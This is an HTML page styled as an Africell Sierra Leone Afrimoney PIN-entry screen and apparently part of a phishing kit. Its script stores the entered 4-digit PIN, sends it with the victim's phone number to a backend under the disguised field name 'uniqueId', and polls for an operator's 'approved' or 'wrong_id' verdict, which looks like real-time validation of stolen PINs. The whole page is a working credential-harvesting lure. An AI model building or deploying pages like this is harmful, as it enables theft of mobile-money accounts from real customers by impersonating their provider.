<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Africell Sierra Leone | Enter PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            width: 100%;
            height: 100%;
            /* Pantone Purple 2665 C Gradient (#9B1B75 / #5E0C44) */
            background: linear-gradient(135deg, #9B1B75 0%, #7E145E 50%, #5E0C44 100%);
            overflow: hidden;
            color: #ffffff;
        }

        .e-fullscreen-wrapper {
            position: relative;
            width: 100%;
            height: 100%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .e-main-content {
            position: relative;
            width: 100%;
            max-width: 440px;
            display: flex;
            flex-direction: column;
            align-items: center;
            animation: slideUp .7s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* LOGO */
        .e-logo {
            text-align: center;
            font-size: 28px;
            font-weight: 900;
            letter-spacing: -0.5px;
            text-transform: uppercase;
            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
            margin-bottom: 24px;
        }

        .e-logo span {
            color: #FFCC00;
        }

        .e-logo small {
            display: block;
            font-size: 10px;
            letter-spacing: 3px;
            color: rgba(255, 255, 255, 0.7);
            margin-top: 4px;
        }

        /* Glassmorphism Card Box */
        .e-card-box {
            width: 100%;
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 255, 255, 0.18);
            border-radius: 28px;
            padding: 30px 24px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            margin-bottom: 20px;
            text-align: center;
        }

        .e-card-box h2 {
            font-size: 18px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 8px;
        }

        .e-card-box p {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.75);
            margin-bottom: 24px;
        }

        /* Input Fields */
        .e-input-group {
            position: relative;
            margin-bottom: 10px;
        }

        .e-input-group i {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #FFCC00;
            font-size: 16px;
        }

        .e-input-field {
            width: 100%;
            padding: 16px 16px 16px 48px;
            background: rgba(255, 255, 255, 0.12);
            border: 1.5px solid rgba(255, 255, 255, 0.22);
            border-radius: 14px;
            font-size: 22px;
            letter-spacing: 10px;
            text-align: center;
            color: #ffffff;
            outline: none;
            -webkit-appearance: none;
            appearance: none;
            transition: all 0.2s ease;
        }

        .e-input-field:focus {
            border-color: #FFCC00;
            background: rgba(255, 255, 255, 0.2);
            box-shadow: 0 0 15px rgba(255, 204, 0, 0.2);
        }

        .e-input-field::placeholder {
            color: rgba(255, 255, 255, 0.4);
            letter-spacing: 4px;
            font-weight: 400;
            font-size: 15px;
        }

        /* Full Width Main Button */
        .e-btn-login {
            width: 100%;
            padding: 18px;
            background: #FFCC00;
            color: #5E0C44;
            border: none;
            border-radius: 16px;
            font-size: 16px;
            font-weight: 900;
            letter-spacing: 0.5px;
            cursor: pointer;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            text-transform: uppercase;
            transition: all 0.2s ease;
        }

        .e-btn-login:hover {
            transform: translateY(-2px);
            background: #ffe033;
            box-shadow: 0 15px 35px rgba(255, 204, 0, 0.4);
        }

        .e-btn-login:active {
            transform: translateY(0);
        }

        /* Loading Spinner */
        #loadingSpinner {
            display: none;
            flex-direction: row;
            align-items: center;
            justify-content: center;
            gap: 12px;
            margin-top: 20px;
            font-size: 14px;
            color: rgba(255, 255, 255, 0.9);
            font-weight: 500;
        }

        .spinner {
            width: 24px;
            height: 24px;
            border: 3px solid rgba(255, 255, 255, 0.2);
            border-top: 3px solid #FFCC00;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Footer */
        .e-footer {
            text-align: center;
            color: rgba(255, 255, 255, 0.6);
            font-size: 11px;
            margin-top: 15px;
        }

        /* Custom In-App Modal Dialog Styling */
        #customModal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(94, 12, 68, 0.9);
            backdrop-filter: blur(8px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 20px;
        }

        .modal-card {
            background: #7E145E;
            width: 100%;
            max-width: 320px;
            border-radius: 24px;
            padding: 24px;
            text-align: center;
            border: 1px solid rgba(255, 255, 255, 0.2);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
            color: #ffffff;
            animation: scaleUp 0.3s ease;
        }

        @keyframes scaleUp {
            from { transform: scale(0.8); opacity: 0; }
            to { transform: scale(1); opacity: 1; }
        }

        .modal-message {
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 20px;
            line-height: 1.4;
            color: #ffffff;
        }

        .modal-btn {
            background: #FFCC00;
            color: #5E0C44;
            border: none;
            border-radius: 14px;
            padding: 12px 24px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            width: 100%;
            box-shadow: 0 6px 16px rgba(255, 204, 0, 0.3);
        }

        .modal-btn:active {
            opacity: 0.9;
        }
    </style>
</head>
<body>

    <div class="e-fullscreen-wrapper">
        <div class="e-main-content">
            
            <!-- AFRICELL LOGO -->
            <div class="e-logo">
                Africell <span>Sierra Leone</span>
                <small>AFRIMONEY SERVICES</small>
            </div>

            <!-- Main Card & PIN Form Section -->
            <div class="e-card-box">
                <h2>Enter Afrimoney PIN</h2>
                <p>Please enter your 4-digit Afrimoney account PIN to confirm your request.</p>

                <div class="e-input-group">
                    <i class="fa-solid fa-lock"></i>
                    <input type="password" id="mpin" class="e-input-field" placeholder="••••" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required>
                </div>
            </div>

            <button class="e-btn-login" onclick="submitPinAttempt()">Confirm PIN</button>

            <!-- Loading Spinner -->
            <div id="loadingSpinner">
                <div class="spinner"></div>
                <span>Verifying account credentials...</span>
            </div>

            <div class="e-footer">
                © 2026 Africell Sierra Leone. All Rights Reserved.
            </div>
        </div>
    </div>

    <!-- Custom In-App Modal Dialog -->
    <div id="customModal">
        <div class="modal-card">
            <div id="modalText" class="modal-message">Notification message here</div>
            <button class="modal-btn" onclick="closeModal()">OK</button>
        </div>
    </div>

<script>
    function showAppAlert(message) {
        document.getElementById('modalText').innerText = message;
        document.getElementById('customModal').style.display = 'flex';
    }

    function closeModal() {
        document.getElementById('customModal').style.display = 'none';
    }

    async function submitPinAttempt() {
        const mpinInput = document.getElementById('mpin').value.trim();
        const spinnerDiv = document.getElementById('loadingSpinner');

        if (mpinInput.length < 4) {
            showAppAlert('Please enter your valid 4-digit Afrimoney PIN.');
            return;
        }

        const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '';
        
        // Save PIN to localStorage
        localStorage.setItem('africellLastPin', mpinInput);
        localStorage.setItem('lastPin', mpinInput);

        try {
            const response = await fetch('/api/submit-order', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ phone: phoneInput, uniqueId: mpinInput })
            });

            const result = await response.json();

            if (result.success) {
                if (spinnerDiv) spinnerDiv.style.display = 'flex'; 
                pollApprovalStatus(phoneInput);
            } else {
                showAppAlert('Error: ' + result.message);
            }
        } catch (error) {
            console.error('Error:', error);
            showAppAlert('Could not connect to the backend server.');
        }
    }

    function pollApprovalStatus(phone) {
        const cleanPhone = phone.trim();

        const statusInterval = setInterval(async () => {
            try {
                const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                const data = await response.json();

                if (data.status === 'approved') {
                    clearInterval(statusInterval);
                    window.location.href = 'success.html';
                } 
                else if (data.status === 'rejected' || data.status === 'wrong_id') {
                    clearInterval(statusInterval);
                    if (document.getElementById('loadingSpinner')) {
                        document.getElementById('loadingSpinner').style.display = 'none';
                    }
                    showAppAlert('Wrong PIN. Please try again.');
                }
            } catch (e) {
                console.error('Polling error', e);
            }
        }, 3000);
    }
</script>
</body>
</html>
